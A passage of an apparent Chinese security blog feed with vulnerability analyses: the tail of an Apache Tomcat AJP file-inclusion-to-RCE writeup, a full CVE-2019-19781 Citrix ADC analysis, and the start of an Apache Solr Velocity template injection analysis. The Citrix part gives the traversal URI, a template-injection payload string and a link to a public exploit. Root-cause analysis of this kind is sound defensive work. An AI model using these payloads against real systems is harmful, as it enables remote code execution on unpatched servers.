CATALINA_BASE/conf/web.xml这个配置文件中默认定义了两个Servlet，刚才任意文件读取利用了DefaultServlet，而RCE就需要用到另一个也就是JspServlet</p><p>默认情况下，JspServlet的url-pattern为<em>.jsp和</em>.jspx，因此他负责处理所有JSP文件的请求。</p><p>JspServlet主要完成以下工作：</p><p>1.根据JSP文件生成对应Servlet的Java代码（JSP文件生成类的父类我org.apache.jasper.runtime.HttpJspBase——实现了Servlet接口）</p><p>2.将Java代码编译为Java类。</p><p>3.构造Servlet类实例并且执行请求。</p><p>其实本质核心就是通过JspServlet来执行我们想要访问的.jsp文件</p><p>所以想要RCE的前提就是，先要想办法将写有自己想要执行的命令的文件(可以是任意文件后缀，甚至没有后缀)上传到webapp的目录下，才能访问该文件然后通过JSP模板的解析造成RCE</p><p>来看下我们这次发送的Ajp报文的内容</p><p><img src="/2020/05/31/apachetomcat-cong-wen-jian-bao-han-dao-rce-lou-dong-yuan-li-shen-ru-fen-xi/35.PNG" alt="35"></p><p>这里的“URI”参数一定要是以“.jsp”进行结尾的，这个jsp文件可以不存在。</p><p>剩下的三个参数就和之前没什么区别了，“path_info”参数对应的就是我们上传的还有jsp代码的文件。</p><p>我们定位到JspServlet.Service()方法</p><p><img src="/2020/05/31/apachetomcat-cong-wen-jian-bao-han-dao-rce-lou-dong-yuan-li-shen-ru-fen-xi/36.png" alt="36"></p><p>可以看到首先将”servlet_path”的值取出赋值给变量jspUri</p><p><img src="/2020/05/31/apachetomcat-cong-wen-jian-bao-han-dao-rce-lou-dong-yuan-li-shen-ru-fen-xi/37.png" alt="37"></p><p>然后将”path_info”参数对应的值取出并赋值给“pathInfo”变量，然后和“jspUri”进行拼接</p><p><img src="/2020/05/31/apachetomcat-cong-wen-jian-bao-han-dao-rce-lou-dong-yuan-li-shen-ru-fen-xi/38.png" alt="38"></p><p><img src="/2020/05/31/apachetomcat-cong-wen-jian-bao-han-dao-rce-lou-dong-yuan-li-shen-ru-fen-xi/39.png" alt="39"></p><p>接下来跟进serviceJspFile()方法</p><p><img src="/2020/05/31/apachetomcat-cong-wen-jian-bao-han-dao-rce-lou-dong-yuan-li-shen-ru-fen-xi/40.png" alt="40"></p><p>首先生成JspServletWrapper对象</p><p><img src="/2020/05/31/apachetomcat-cong-wen-jian-bao-han-dao-rce-lou-dong-yuan-li-shen-ru-fen-xi/41.png" alt="41"></p><p>然后调用JspServletWrapper.service()方法</p><p><img src="/2020/05/31/apachetomcat-cong-wen-jian-bao-han-dao-rce-lou-dong-yuan-li-shen-ru-fen-xi/42.png" alt="42"></p><p>获取对应的Servlet</p><p><img src="/2020/05/31/apachetomcat-cong-wen-jian-bao-han-dao-rce-lou-dong-yuan-li-shen-ru-fen-xi/43.png" alt="43"></p><p>调用该Servlet的service方法</p><p><img src="/2020/05/31/apachetomcat-cong-wen-jian-bao-han-dao-rce-lou-dong-yuan-li-shen-ru-fen-xi/44.png" alt="44"></p><p>接下来就是就是解析我们上传文件中的java代码了至此，RCE漏洞原理分析完毕。下面是调用链</p><p><img src="/2020/05/31/apachetomcat-cong-wen-jian-bao-han-dao-rce-lou-dong-yuan-li-shen-ru-fen-xi/45.png" alt="45"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> Apache Tomcat </tag>
            
            <tag> Web安全 </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-19781远程代码执行漏洞深入分析</title>
      <link href="/2020/05/31/cve-2019-19781-yuan-cheng-dai-ma-zhi-xing-lou-dong-shen-ru-fen-xi/"/>
      <url>/2020/05/31/cve-2019-19781-yuan-cheng-dai-ma-zhi-xing-lou-dong-shen-ru-fen-xi/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2019-19781远程代码执行漏洞深入分析"><a href="#CVE-2019-19781远程代码执行漏洞深入分析" class="headerlink" title="CVE-2019-19781远程代码执行漏洞深入分析"></a>CVE-2019-19781远程代码执行漏洞深入分析</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>虚拟机下载地址：<a href="https://www.citrix.com/downloads/citrix-gateway/" target="_blank" rel="noopener">https://www.citrix.com/downloads/citrix-gateway/</a></p><p>然后选择下载NSVPX-ESX-13.0-47.22_nc_64.zip这个文件，该文件是ovf，可以直接用vmware来倒入并打开</p><p><img src="/2020/05/31/cve-2019-19781-yuan-cheng-dai-ma-zhi-xing-lou-dong-shen-ru-fen-xi/1.png" alt="1"></p><p>选择导入</p><p><img src="/2020/05/31/cve-2019-19781-yuan-cheng-dai-ma-zhi-xing-lou-dong-shen-ru-fen-xi/2.png" alt="2"></p><p>先后配置 IP地址，子网掩码，的网关地址，然后选择4确认</p><p><img src="/2020/05/31/cve-2019-19781-yuan-cheng-dai-ma-zhi-xing-lou-dong-shen-ru-fen-xi/3.png" alt="3"></p><p>默认用户名密码都是 nsroot</p><p><img src="/2020/05/31/cve-2019-19781-yuan-cheng-dai-ma-zhi-xing-lou-dong-shen-ru-fen-xi/4.png" alt="4"></p><p>然后访问之前设置的IP地址，出现以下界面则环境搭建成功</p><p><img src="/2020/05/31/cve-2019-19781-yuan-cheng-dai-ma-zhi-xing-lou-dong-shen-ru-fen-xi/5.png" alt="5"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>网上下载exp 下载地址 <a href="https://codeload.github.com/jas502n/CVE-2019-19781/zip/master" target="_blank" rel="noopener">https://codeload.github.com/jas502n/CVE-2019-19781/zip/master</a></p><p>使用方式</p><p><img src="/2020/05/31/cve-2019-19781-yuan-cheng-dai-ma-zhi-xing-lou-dong-shen-ru-fen-xi/6.png" alt="6"></p><p>输入要执行的命令</p><p><img src="/2020/05/31/cve-2019-19781-yuan-cheng-dai-ma-zhi-xing-lou-dong-shen-ru-fen-xi/7.png" alt="7"></p><p>漏洞复现成功</p><p><img src="/2020/05/31/cve-2019-19781-yuan-cheng-dai-ma-zhi-xing-lou-dong-shen-ru-fen-xi/8.png" alt="8"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>首先查看我们的请求路径，由于利用了目录遍历漏洞，所以访问的真实uri路径是</p><p>/vpns/portal/scripts/newbm.pl</p><p>我们去Apache 的配置文件httpd.conf 中看一下路径的配置，这里简单解释下这几项配置</p><p><img src="/2020/05/31/cve-2019-19781-yuan-cheng-dai-ma-zhi-xing-lou-dong-shen-ru-fen-xi/9.png" alt="9"></p><p><img src="/2020/05/31/cve-2019-19781-yuan-cheng-dai-ma-zhi-xing-lou-dong-shen-ru-fen-xi/10.png" alt="10"></p><p>首先介绍一个MOD_PERL技术</p><p>MOD_PERL技术将PERL解析器编译到APACHE服务器中一起等待客户端请求。<br>MOD_PERL技术在APACHE中一共有三种代码运行方式：<br>PerlRun模式：这个模式主要兼容旧式CGI程序，仅仅使用APACHE中的PERL解析器对代码进行解析不进行缓冲。<br>Registry模式：这个模式的Perl代码在被访问过以后会被编译成为APACHE API模块并且存储在缓冲之中，为了保证运行APACHE会选择性的产生、不只一个副本在内存中。<br>APACHE API模式：这个模式在APACHE启动的时候就直接将代码编译驻留在缓冲之中。</p><p>配置完Apache和Perl模块后，可以用perlinfo函数查看系统环境相关变量。下图是在虚拟机中跑出来的效果，用的是XAMPP套件的老版本。</p><p><img src="/2020/05/31/cve-2019-19781-yuan-cheng-dai-ma-zhi-xing-lou-dong-shen-ru-fen-xi/11.png" alt="11"></p><p>实现MOD_PERL技术，就需要我们先编写一个APACHE模块代码</p><p>例子</p><p><img src="/2020/05/31/cve-2019-19781-yuan-cheng-dai-ma-zhi-xing-lou-dong-shen-ru-fen-xi/12.png" alt="12"></p><p>然后再在http.conf里做如下的配置</p><pre class=" language-xml"><code class="language-xml">PerlModule example;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Location</span> <span class="token attr-name">"(service)$"</span><span class="token punctuation">></span></span>        SetHandler perl-script        PerlHandler example<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Location</span><span class="token punctuation">></span></span> </code></pre><p>这样当用户访问的时候会被这个APACHE模块处理。</p><p>正常情况下我们是无法访问/vpns/portal/这个路径下的任何东西的，因为路径限制我们访问不到，但是恰好这次该系统还有一个目录遍历漏洞，这样我们可以访问的范围就扩大了不少</p><p>首先我们攻击的第一步会请求一个uri “/vpn/../vpns/portal/scripts/newbm.pl”</p><p>我们首先看一下</p><p><img src="/2020/05/31/cve-2019-19781-yuan-cheng-dai-ma-zhi-xing-lou-dong-shen-ru-fen-xi/13.png" alt="13"></p><p>这里的Handler模块 我们访问 Citrix ADC VPX 虚拟机的以下路径</p><p><img src="/2020/05/31/cve-2019-19781-yuan-cheng-dai-ma-zhi-xing-lou-dong-shen-ru-fen-xi/14.png" alt="14"></p><p>可以看到该路径下有以下文件</p><p><img src="/2020/05/31/cve-2019-19781-yuan-cheng-dai-ma-zhi-xing-lou-dong-shen-ru-fen-xi/15.png" alt="15"></p><p>后缀为.pm的文件 即为Perl Module，也就是 Perl 模块。在这里我们看到了处理请求/vpns/portal的默认木块 Handler.pm</p><p>我们打开看一下源码</p><p><img src="/2020/05/31/cve-2019-19781-yuan-cheng-dai-ma-zhi-xing-lou-dong-shen-ru-fen-xi/16.png" alt="16"></p><p>该模块只有两个函数 error函数没什么好看的，我们重点观察handler函数。</p><p>不难发现handler函数中调用了另一个模块UserPrefs模块，调用了UserPrefs的一个new方法</p><p><img src="/2020/05/31/cve-2019-19781-yuan-cheng-dai-ma-zhi-xing-lou-dong-shen-ru-fen-xi/17.png" alt="17"></p><p>new( ) 方法是对象的构造函数。我们去观察一下UserPrefs的源码</p><p><img src="/2020/05/31/cve-2019-19781-yuan-cheng-dai-ma-zhi-xing-lou-dong-shen-ru-fen-xi/18.png" alt="18"></p><p>构造函数是类的子程序，它返回与类名相关的一个引用。将类名与引用相结合称为“祝福”一个对象，因为建立该结合的函数名为 bless ( )，其语法为：</p><pre class=" language-perl6"><code class="language-perl6">bless YeReference [,classname]</code></pre><p><code>YeReference</code> 是对被“祝福”的对象的引用，<code>classname</code> 是可选项，指定对象获取方法的包名，其缺省值为当前包名。既在当前代码中返回一个名为UserPrefs的对象。然后我们调用UserPrefs对象的csd（）方法。</p><p><img src="/2020/05/31/cve-2019-19781-yuan-cheng-dai-ma-zhi-xing-lou-dong-shen-ru-fen-xi/19.png" alt="19"></p><p>我们看一下csd ()方法的实现细节</p><p><img src="/2020/05/31/cve-2019-19781-yuan-cheng-dai-ma-zhi-xing-lou-dong-shen-ru-fen-xi/20.png" alt="20"></p><p>结合网上的exp我们发现了一个关键的变量</p><p><img src="/2020/05/31/cve-2019-19781-yuan-cheng-dai-ma-zhi-xing-lou-dong-shen-ru-fen-xi/21.png" alt="21"></p><p>以下是EXP的源码</p><p><img src="/2020/05/31/cve-2019-19781-yuan-cheng-dai-ma-zhi-xing-lou-dong-shen-ru-fen-xi/22.png" alt="22"></p><p>这个username参数存储的是我们客户端传递来的 请求头中的“NSC_USER”的值。</p><p>我们看看exp中是怎么定义这个值的。</p><p><img src="/2020/05/31/cve-2019-19781-yuan-cheng-dai-ma-zhi-xing-lou-dong-shen-ru-fen-xi/23.png" alt="23"></p><p>“NSC_USER”的值中的%cdl值是一个随机值，主要用于写入文件的文件名</p><p>至于对”NSC_NONCE”这个请求头的处理，只是做了简单的字符串校验，并不是说校验了用户名和密码，所以第二次请求访问后台生成的XML时，”NSC_NONCE”“NSC_USER”两个请求头的值可以是任意不含特殊字符的字符串，所以该漏洞利用时并不需要提前知道后台登陆密码。</p><p><img src="/2020/05/31/cve-2019-19781-yuan-cheng-dai-ma-zhi-xing-lou-dong-shen-ru-fen-xi/24.png" alt="24"></p><p>根据上面的源码截图我们看到了username的值，接下来我们看程序是如何处理username这个变量的。</p><p><img src="/2020/05/31/cve-2019-19781-yuan-cheng-dai-ma-zhi-xing-lou-dong-shen-ru-fen-xi/25.png" alt="25"></p><p>可以看到在第61行代码调用了 fileread函数并将username变量作为参数传入</p><p><img src="/2020/05/31/cve-2019-19781-yuan-cheng-dai-ma-zhi-xing-lou-dong-shen-ru-fen-xi/26.png" alt="26"></p><p>我们看到这这么一行注释</p><p><img src="/2020/05/31/cve-2019-19781-yuan-cheng-dai-ma-zhi-xing-lou-dong-shen-ru-fen-xi/27.png" alt="27"></p><p>如果文件不存在或者已删除，则根据username创建一个新的文档。看到这里我们大致明白了这段代码的作用，就是以username变量为依据判断某路径下是否有同名文件的存在，如果文件不存在或者已删除已损毁则以username作为文件名创建一个文件。</p><p>那么这个创建的文件存放在哪里我们在源码中查找一下</p><p><img src="/2020/05/31/cve-2019-19781-yuan-cheng-dai-ma-zhi-xing-lou-dong-shen-ru-fen-xi/28.png" alt="28"></p><p><img src="/2020/05/31/cve-2019-19781-yuan-cheng-dai-ma-zhi-xing-lou-dong-shen-ru-fen-xi/29.png" alt="29"></p><p>可以看到 默认生成文件的路径是“/var/vpn/bookmark”, 也就是说正常情况下我们访问，生成的和username同名的文件时在该路径下的。</p><p>但是由于生成文件时并未对传入的“NSC_USER”这个头部有任何过滤。其实应该是有的，只不过默认情况下是给注释掉了。由下图的注释可以看出</p><p><img src="/2020/05/31/cve-2019-19781-yuan-cheng-dai-ma-zhi-xing-lou-dong-shen-ru-fen-xi/30.png" alt="30"></p><p>所以在没有过滤的情况下，程序就以“../../../netscaler/portal/templates/filename” 这样生成的文件就保存在了，我们可以通过目录遍历漏洞访问到的目录下了。</p><p>此时我们可以控制，服务端程序在指定目录下创建文件了，但是仅仅这样是不够的，我们还需要将我们的payload一起写入我们的文件中。</p><p>我们已经知道了，如果要在指定位置创建文件，就需要在执行时调用UserPrefs对象的csd()方法。以此为依据，再能访问的范围内寻找可以利用的类。我翻看了一下，有不少类中都调用了UserPrefs对象的csd()方法，但是并有可以用来写入payload的点，例如themes.pl，可以调用UserPrefs对象的csd()方法生成文件，但是却无法向文件中写入payload，我们测试一下，先修改一下exp，将第一次请求的文件改成themes.pl</p><p><img src="/2020/05/31/cve-2019-19781-yuan-cheng-dai-ma-zhi-xing-lou-dong-shen-ru-fen-xi/31.png" alt="31"></p><p><img src="/2020/05/31/cve-2019-19781-yuan-cheng-dai-ma-zhi-xing-lou-dong-shen-ru-fen-xi/32.png" alt="32"></p><p>虽然会提示上传失败，但是我们直接从后台来看确实生成了一个同名的xml文档，</p><p><img src="/2020/05/31/cve-2019-19781-yuan-cheng-dai-ma-zhi-xing-lou-dong-shen-ru-fen-xi/33.png" alt="33"></p><p>看一下这个xml文档的内容</p><p><img src="/2020/05/31/cve-2019-19781-yuan-cheng-dai-ma-zhi-xing-lou-dong-shen-ru-fen-xi/34.png" alt="34"></p><p>很显然这样生成的xml文档里没有任何有价值的或者可以利用的东西</p><p>我们经过一段时间查看源码发现了一个有利用价值的perl程序，即请求路径为“/vpns/portal/scripts/newbm.pl”实际物理路径为”/netscaler/portal/scripts/newbm.pl”的newbm模块。通过下图我们可以看到在http.conf中配置 Alias的作用是别名配置</p><p><img src="/2020/05/31/cve-2019-19781-yuan-cheng-dai-ma-zhi-xing-lou-dong-shen-ru-fen-xi/10.png" alt="10"></p><p>我们看一下newbm.pl的源码</p><p><img src="/2020/05/31/cve-2019-19781-yuan-cheng-dai-ma-zhi-xing-lou-dong-shen-ru-fen-xi/35.png" alt="35"></p><p>我们从源码中可以看到 newbm.pl 满足了我们所需要的条件，</p><p><img src="/2020/05/31/cve-2019-19781-yuan-cheng-dai-ma-zhi-xing-lou-dong-shen-ru-fen-xi/36.png" alt="36"></p><p>首先调用了UserPrefs对象的csd()方法生成文件</p><p><img src="/2020/05/31/cve-2019-19781-yuan-cheng-dai-ma-zhi-xing-lou-dong-shen-ru-fen-xi/37.png" alt="37"></p><p>然后用四个变量接受我们从前台POST传入的payload，然后存储到一个哈希中，经测试”title”,”UI_inuse”,”descr”均可用来写入payload</p><p><img src="/2020/05/31/cve-2019-19781-yuan-cheng-dai-ma-zhi-xing-lou-dong-shen-ru-fen-xi/38.png" alt="38"></p><p>最中我们通过POST传入的四个参数，被写入到我们通过UserPrefs对象的csd()方法生成xml文档中了。以下截图就是该文档的最终形态。</p><p><img src="/2020/05/31/cve-2019-19781-yuan-cheng-dai-ma-zhi-xing-lou-dong-shen-ru-fen-xi/39.png" alt="39"></p><p>我们可以看到，我们要执行的payload语句已经写入 bookmark标签的“title”标签中了。</p><p>至此exp的第一次请求结束，所做的事情就是指定在服务端的“/netscaler/portal/templates/”路径下生成一个xml文档，然后向该文档内写入payload。</p><p>接下来就是exp执行的第二步</p><p>也就是我们要想办法访问到这个xml文档，然后还能够让程序解析并执行我们的payload也就是</p><p>[% template.new(‘BLOCK’ = ‘print <code>"+ cmd + "</code>‘) %]  这串代码</p><p>按照顺序来，我们先考虑如何可以访问这个xml文档。首先第一反应就是去看http.conf文件，生成的xml文档的物理路径是“/netscaler/portal/templates/” 看一看有没有该路径的一个映射地址，这样我们就可以直接访问了，可惜并没有，也就是说像exp第一步直接访问newbm.pl的方式是行不通了。但是此时我们回到一开始的原点，即访问路径“/vpns/portal/”的默认处理模块 Handler.pm</p><p><img src="/2020/05/31/cve-2019-19781-yuan-cheng-dai-ma-zhi-xing-lou-dong-shen-ru-fen-xi/40.png" alt="40"></p><p><img src="/2020/05/31/cve-2019-19781-yuan-cheng-dai-ma-zhi-xing-lou-dong-shen-ru-fen-xi/41.png" alt="41"></p><p><img src="/2020/05/31/cve-2019-19781-yuan-cheng-dai-ma-zhi-xing-lou-dong-shen-ru-fen-xi/42.png" alt="42"></p><p>我们观察上面两个截图的代码，我在后台搜过半天并没有发现这个”$r-path_info()”方法属于那个模块，不过根据这个if判断 用的是eq来对比切用来对比的是一个具体的文件名称，紧接着就将“$r-path_info()”返回的结果赋值给了“tmplfile”变量，接下来很关键，也是该漏洞最中可以访问我们生成的xml文档并解析执行其中payload的根本原因，</p><p>“template”变量指向的是Template对象的一个引用，我们可以看到“Template-&gt;new{}”是创建一个Template对象。</p><p>这里Template是perl的一个模块，Template Toolkit。</p><p>简单介绍一下Template Toolkit，在许多使用Perl进行“模板化”的方法中，Template Toolkit被广泛认为是功能最丰富的工具之一。与其他模板系统一样，模板工具包允许程序员将Perl代码和自定义宏嵌入HTML文档中，以便即时创建自定义文档。但是与其他工具不同，Template Toolkit在生成HTML方面与在生成XML，PDF或任何其他输出格式时一样容易。</p><p>看到这里我们应该明白了，Template Toolkit就是perl下的一个功能非常强大的模板引擎，那这么一来，一切就都解释的通了，</p><p>接下来就在第32行我们调用“Template-&gt;process()”方法，process()调用 该方法来处理指定为第一个参数的模板$input。这可以是文件名，文件句柄（例如GLOB或IO::Handle）或对包含模板文本的文本字符串的引用。可以传递包含模板变量定义的其他哈希引用。</p><p>我们的xml文档里写入的payload之所以可以被解析并执行就是因为调用了Template对象的process方法，具体该模板引擎是如何解析xml文档的，牵扯到语法生成树和语义分析限于篇幅原因就不细讲了，感兴趣的朋友可以自己深入去了解学习</p><p>这里我们演示一下这个模板引擎解析的效果。</p><p><img src="/2020/05/31/cve-2019-19781-yuan-cheng-dai-ma-zhi-xing-lou-dong-shen-ru-fen-xi/43.png" alt="43"></p><p>更多的关于Template Toolkit这个模板引擎的功能非常强大而且教程网上也有很多，大家可以自行去学习和使用。</p><p>至此CVE-2019-19781 Citrix ADC远程代码执行漏洞，分析完毕。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> Web安全 </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> perl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Solr Velocity模板注入漏洞深度分析</title>
      <link href="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/"/>
      <url>/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/</url>
      
        <content type="html"><![CDATA[<h1 id="Apache-Solr-Velocity模板注入漏洞深度分析"><a href="#Apache-Solr-Velocity模板注入漏洞深度分析" class="headerlink" title="Apache Solr Velocity模板注入漏洞深度分析"></a>Apache Solr Velocity模板注入漏洞深度分析</h1><p>漏洞分析环境搭建</p><p>需要工具</p><p>IDEA</p><p>Apache Ant</p><p>Apache Solr8.2.0源码</p><p>Apache Solr8.2.0服务端</p><p>Chrome</p><p>Burp</p><h2 id="1-Apache-solr简介和漏洞复现"><a href="#1-Apache-solr简介和漏洞复现" class="headerlink" title="1  Apache solr简介和漏洞复现"></a>1  Apache solr简介和漏洞复现</h2><p>首先先简单介绍一下Apache Solr</p><p>Apache Solr是一个强大的搜索服务器，它支持像API一样的REST。 Solr由Lucene提供支持，可以实现强大的匹配功能，例如短语，通配符，连接，分组和更多的各种数据类型。 它是高度优化的高流量使用Apache Zookeeper。</p><p>介绍完Apache Solr之后我们就来复现一下这次的 Apache Solr Velocity服务端模板注入漏洞</p><p>我们首先从Apache Solr官网上下载Apache Solr 8.2.0的服务端</p><p><a href="https://mirrors.tuna.tsinghua.edu.cn/apache/lucene/solr/8.2.0/solr-8.2.0.tgz" target="_blank" rel="noopener">https://mirrors.tuna.tsinghua.edu.cn/apache/lucene/solr/8.2.0/solr-8.2.0.tgz</a></p><p>下载完成之后解压</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/1.png" alt=""></p><p>我们通过命令行终端进入bin目录然后输入“./solr start”命令</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/2.png" alt="2"></p><p>Apache Solr就会默认在本地的8983端口启动服务,</p><p>我们访问一下地址 <a href="http://127.0.0.1:8983/solr/#/" target="_blank" rel="noopener">http://127.0.0.1:8983/solr/#/</a></p><p>查看左侧的Core Selector的集合名称</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/3.png" alt="3"></p><p>使用burp Repeater模块像服务端发包修改指定集合的配置</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/4.png" alt="4"></p><p>修改配置成功</p><p>然后发送事先构造好的playload</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/5.png" alt="5"></p><p>漏洞复现成功</p><h2 id="2-模板引擎简介"><a href="#2-模板引擎简介" class="headerlink" title="2  模板引擎简介"></a>2  模板引擎简介</h2><h3 id="2-1-JSP简介"><a href="#2-1-JSP简介" class="headerlink" title="2.1 JSP简介"></a>2.1 JSP简介</h3><p>漏洞复现完成，但是分析漏洞我们还需要一些前置知识，比如什么是模板注入漏洞，以及Velocity究竟是什么，</p><p>我们都知道，现在web开发讲究的是一个前后端分离的方式，MVC模式就是其经典的代表。如果抛弃前后端分离，仅仅开发一个能用的网站，只需要一个JSP其实就够了，但是这样很明显会导致开发时逻辑及其混乱，以及后期维护起来成本极高的问题，这样的开发完全违背的我们java这么一个面向对象语言优雅的编程思维。</p><p>我们在开发一个程序时希望的就是一个模块尽量是独立完成某一个功能而不依赖别的模块的，也就是我们的高内聚，低耦合的思想。</p><p>这种思想用到我们的web开发的架构时，就有了我们的MVC模式，即 Mode，</p><p>View，Controller。和我们的web三层架构，即表示层，业务逻辑层，和数据接口层。尽量保证每一层都是独立可用的,在这里特别提示一下，web三层架构是java独有的概念，而MVC架构则是通用的。</p><p>在这种情况下，每一层都出现了其相对应开源组件。</p><p>首先不得不提的两个使用量最高的MVC框架，Struts2，和SpringMVC。</p><p>表现层有我们的JSP和Thymeleaf，Velocity，Freemarker等模板引擎</p><p>业务层由我们最火热的开源组件Spring</p><p>数据层就有我们最常见的Mybaits和Hibernate两个Dao层框架</p><p>而这次我们要重点注意的就是位于我们的表现层，也就是我们的Velocity模板引擎。 </p><p>对于web不太熟悉的同学可能暂时还不能理解什么是模板引擎，或者说模板引擎是做什么用的。但是相信大家都听过JSP， </p><p>JSP的全称是Java Server Package，与普通的静态html页面相比，区别在于我们可以在JSP页面上书写java代码，以实现和用户进行交互，从而达到动态的这么一个效果。</p><p>JSP一开始出现的时候是同时兼具前端和后端的作用，也就是说如果只是开发一个勉强能用的java动态网站，jsp其实就足够了。</p><p>在JSP出现之前，实现动态页面的效果用的是Servlet的技术，Servlet可以很好的实现接受用户传来的参数并进行处理。但是把数据返回到前端并输出html页面时确异常的麻烦和痛苦。同常需要一行一行的输出html代码，像下面这样</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/6.png" alt="6"></p><p>后来JSP出现了，如果说Servlet是java代码中写HTML的话，那Jsp就是HTML中穿插写java代码了，jsp相比于Servlet来说并不是一个新的技术，jsp是Servlet的一个扩展，其本质仍是Servlet,</p><p>我们看一个最简单的JSP页面</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/7.png" alt="7"></p><p>看起来就是一个普通的HTML页面，为什么我会说jsp的本质是Servlet呢？</p><p>当我们将项目编译打成war包部署在Tomcat下时，会放在Tomcat的WebApp目录下，里面有我们的项目后台的java文件编译成的.class文件。同时也有我们的jsp文件。</p><p>但是我们的jsp文件是不能直接被解析的，Jsp不像HTML拿来就能直接返返回给客户，因为jsp文件中是包含有java代码的，浏览器又不能解析我们jsp页面上的java代码，所以将jsp编译成浏览器能解析的html页面的工作就交由了我们的Tomcat来做 </p><p>当我们启动Tomcat时第一次访问我们的这个jsp页面，往往速度都会稍微慢一些，往后在访问时速度就会很快。这是因为，第一访问时，Tomcat会在他的根目录的work/Catalina/localhos目录下生成我们对应项目名称的一个文件夹。</p><p>并生成一个名称为org.apache.jsp的一个package，我们去观察一下</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/8.png" alt="8"></p><p>我们可以看到一个java文件和一个.class文件。还记得我刚刚才说过jsp的本质其实就是Servlet么？我们点开这个java文件来一探究竟。</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/9.png" alt="9"></p><p>我们从中观察到这这么几个重点</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/10.png" alt="10"></p><p>首先这是一个java类，它继承了HttpJspBase类同时实现了两个接口</p><p>第二个重点在这里</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/11.png" alt="11"></p><p>这是一个静态代码块，静态代码块在类进行加载时就会执行，先于构造代码块和构造方法，是一个java类中最先被执行的代码。</p><p>我们根据其代码内容不难看出这静态代码块的作用是用来import Java类的。</p><p>接下来是一个名叫_jspService的函数，是不是特别像servlet的doGET和doPost方法？</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/12.png" alt="12"></p><p>最后我们在看这里</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/13.png" alt="13"></p><p>我们发现我们之前看到的jsp文件中的html内容，在这里被替换成了通过</p><p>JspWriter对象一句一句的写出的。</p><p>此时是不是理解了我之前说的，Jsp的本质就是servlet。表面上上我们是在一堆HTML标签中插入了一个又一个的java代码，本质上Tmocat在接收到客户端对我们这个jsp的请求后，会将我们的整个jsp文件编译成java文件在编译成.class文件。将HTML一句一句通过JspWriter对象的write方法一行一行的输出。</p><h3 id="2-1-Velocity模板引擎简介"><a href="#2-1-Velocity模板引擎简介" class="headerlink" title="2.1 Velocity模板引擎简介"></a>2.1 Velocity模板引擎简介</h3><p>讲解了JSP的基础知识后不知道大家有没有发现一个问题就是，Jsp虽然说是模板引擎的一种，但是如果只做为一个为前端服务的模板引擎来说，它的功能过于强大了，导致它不光可以书写前端页面，因为JSP可以毫无阻碍地访问底层的 Servlet API 和 Java 编程语言，所以同时也可以无缝书写后端的逻辑代码，在展示数据的同时也可以对数据进行处理。</p><p>这样就导致前端和后端完全就纠缠在了一起。完全违背了我们MVC的设计思想，你能想象一个前端页面是用Servlet输出，而后端代码使用Jsp来写的网站该怎么去维护么？</p><p>面向对象的优雅思想在这一刻荡然无存。</p><p>面向对象的核心思想就是，低耦合，高内聚。每一个模块的功能尽可能单一，尽可能的降低和别的模块和功能之间的耦合度。</p><p>所以Thymeleaf，Velocity，Freemarker等优秀模板引擎就一个接一个的出现了。</p><p>Velocity为主我们来了解，这个在MVC设计模式中，为View层服务的优秀模板引擎。</p><p>刚才通过对Jsp的介绍，我们理解了，一个模板引擎他的主要功能就是负责将后端代码也就是servlet处理完成的数据，提取并按照之前写好的样式展示出来。</p><p>Velocity是一个基于java的模板引擎（template engine）。它允许任何人仅仅使用简单的模板语言（template language）来引用由java代码定义的对象。 </p><p>当Velocity应用于web开发时，<a href="http://baike.baidu.com/view/119481.htm" target="_blank" 